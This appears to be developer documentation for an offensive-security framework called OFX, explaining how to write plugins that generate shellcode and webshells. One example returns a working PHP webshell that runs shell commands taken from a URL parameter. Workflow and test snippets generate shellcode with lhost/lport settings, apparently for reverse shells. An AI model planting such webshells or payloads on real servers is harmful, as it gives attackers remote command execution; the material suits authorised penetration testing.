# Extending Data Modules

Quick guide to locate OFX data files and add custom shellcode/webshell connectors.

## Where data lives

- Code ships with `data/shellcode`, `data/webshell`, `data/site`.
- Programmatic lookup: `from ofx.settings import DATA_DIR`.
- Check path: `python -c "from ofx.settings import DATA_DIR; print(DATA_DIR)"`.

## Shellcode connectors (new ones)

1) Create a file in `src/ofx/data/shellcode/connectors/`.
2) Subclass `ShellcodeConnector`; implement `generate()` and optionally `check_available()`.
```python
from ofx.data.shellcode.connectors.base import ShellcodeConnector
import shutil, subprocess

class CustomShellcodeConnector(ShellcodeConnector):
    def __init__(self):
        super().__init__(name="custom-tool", description="My generator")
    def check_available(self):
        return shutil.which("custom-tool") is not None
    def generate(self, arch: str, format: str = "raw", **kw) -> bytes:
        return subprocess.check_output(["custom-tool", "-a", arch, "-f", format])
```
3) Register in `data/shellcode/connectors/__init__.py` via `CONNECTORS["custom-tool"] = CustomShellcodeConnector`.

## Webshell connectors (new ones)

1) Add a file under `src/ofx/data/webshell/connectors/` and subclass `WebshellConnector`.
2) Implement `generate(language, password, encoder, **kwargs)` and `check_available` if needed.
```python
from ofx.data.webshell.connectors.base import WebshellConnector

class MinimalWebshellConnector(WebshellConnector):
    def __init__(self):
        super().__init__(name="mini", description="Tiny webshell")
    def generate(self, language: str, password: str = "pass", **_):
        if language != "php":
            raise ValueError("php only")
        return f"<?php if($_GET['p']!=='{password}')die(); system($_GET['cmd']); ?>"
```
3) Register in `data/webshell/connectors/__init__.py` via `CONNECTORS["mini"] = MinimalWebshellConnector`.

## Using custom connectors

```python
from ofx.data.shellcode.connectors import CONNECTORS as shellcode
from ofx.data.webshell.connectors import CONNECTORS as webshell

payload = shellcode["custom-tool"]().generate(arch="x64")
php = webshell["mini"]().generate(language="php", password="s3cr3t")
```

### In Workflows

Reference connectors in workflow YAML:

```yaml
jobs:
  generate_payload:
    steps:
      - name: Generate shellcode
        run: |
          from ofx.data.shellcode.connectors import CONNECTORS
          connector = CONNECTORS["custom-tool"]()
          shellcode = connector.generate(
            arch="x64",
            lhost="${{ secrets.lhost }}",
            lport=4444
          )
          with open("payload.bin", "wb") as f:
              f.write(shellcode)
      
      - name: Generate webshell
        run: |
          from ofx.data.webshell.connectors import CONNECTORS
          connector = CONNECTORS["advanced"]()
          code = connector.generate(
            language="php",
            password="${{ secrets.webshell_pass }}"
          )
          print(f"webshell={code}")
        outputs:
          webshell: "${{ step.webshell }}"
```

## Best Practices

### Error Handling

Always validate inputs and handle errors gracefully:

```python
def generate(self, arch: str, **kwargs) -> bytes:
    try:
        self.validate_params(arch, kwargs.get("format", "raw"))
        return self._do_generate(arch, **kwargs)
    except ValueError as e:
        raise ValueError(f"Invalid parameters: {e}")
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Generation failed: {e.stderr.decode()}")
    except Exception as e:
        raise RuntimeError(f"Unexpected error: {e}")
```

### Dependency Checking

Check for required tools/libraries:

```python
def check_available(self) -> bool:
    """Check if required dependencies are available."""
    # Check for command-line tools
    if not shutil.which("required-tool"):
        return False
    
    # Check for Python modules
    try:
        import required_module
        return True
    except ImportError:
        return False
```

### Logging

Use logging for debugging:

```python
import logging

logger = logging.getLogger(__name__)

def generate(self, arch: str, **kwargs) -> bytes:
    logger.debug(f"Generating shellcode for {arch}")
    result = self._do_generate(arch, **kwargs)
    logger.info(f"Generated {len(result)} bytes of shellcode")
    return result
```

### Testing

Create tests for your connectors:

```python
# tests/test_custom_connector.py

import pytest
from ofx.data.shellcode.connectors.custom_connector import CustomShellcodeConnector

def test_connector_available():
    connector = CustomShellcodeConnector()
    # Test should adapt based on whether tool is installed
    assert isinstance(connector.available, bool)

def test_generate_shellcode():
    connector = CustomShellcodeConnector()
    if not connector.available:
        pytest.skip("Connector not available")
    
    shellcode = connector.generate(
        arch="x64",
        format="raw",
        lhost="127.0.0.1",
        lport=4444
    )
    assert isinstance(shellcode, bytes)
    assert len(shellcode) > 0

def test_invalid_arch():
    connector = CustomShellcodeConnector()
    with pytest.raises(ValueError):
        connector.generate(arch="invalid", format="raw")
```

## Additional Resources

- [Shellcode API Documentation](../api/exploitation.md#shellcode-generation)
- [Webshell API Documentation](../api/exploitation.md#webshell-apis)
- [Workflow Integration](workflows.md)
- [Template System](templates.md)
